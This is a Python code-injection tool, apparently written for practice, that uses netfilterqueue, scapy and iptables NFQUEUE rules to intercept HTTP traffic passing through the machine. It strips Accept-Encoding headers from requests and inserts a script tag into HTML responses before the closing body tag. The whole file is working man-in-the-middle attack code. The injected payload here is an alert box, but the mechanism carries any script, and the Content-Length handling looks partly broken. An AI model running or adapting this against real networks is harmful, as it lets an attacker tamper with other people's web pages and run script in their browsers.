#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import optparse
import subprocess
import re

# Takes in user arguments
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--test", dest="test_method", help="Are you running this locally? (Y or N)")
    options, arguments = parser.parse_args()

    if not options.test_method:
        parser.error("[-] Enter a valid argument for this field")
    else:
        return options.test_method

# Assigns a new value for the load of a given packet
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# Siphons valuable data from the packet it receives
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # Asks for packets with TCP and Raw layers
    if (scapy.Raw in scapy_packet) and (scapy.TCP in scapy_packet):
        load = scapy_packet[scapy.Raw].load
        # For HTTP Requests do this ...
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request")
            # Tell the web browser we don't understand any kind of encodings ~ sends us html code uncompressed
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(load))
        # For HTTP Responses do this ...
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            # Grabs current content length
            content_length = re.search("(?:Content-Length:\s)(\d*)", str(load))
            injector_code = "<script>alert('!Hacked!')</script>;"
            # Injects our script into the closing body tag of the webpage
            load = load.replace("</body>".encode(), injector_code.encode() + "</body>".encode())
            if (content_length) and ("text/html".encode() in load):
                content_length = content_length.group(1)
                new_content_length = int(content_length) + len(injector_code)
                load = load.replace(bytes(content_length), bytes(new_content_length))
        # If you detect any changes to my load, then update my packet
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))
    packet.accept()

# Driver
run_method = get_arguments()

# Preparing for data manipulation
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

if "Y" in run_method:
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])

elif "N" in run_method:
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
else:
    print("[-] There was an error reading the user input")
    print("[-] Expected: Y or N")
    print("[-] Received: " + run_method)


try:
    print("[+] Starting code injector ...")
    queue.run()
except KeyboardInterrupt:
    print("[-] Ending program ...")
    subprocess.call(["iptables", "--flush"])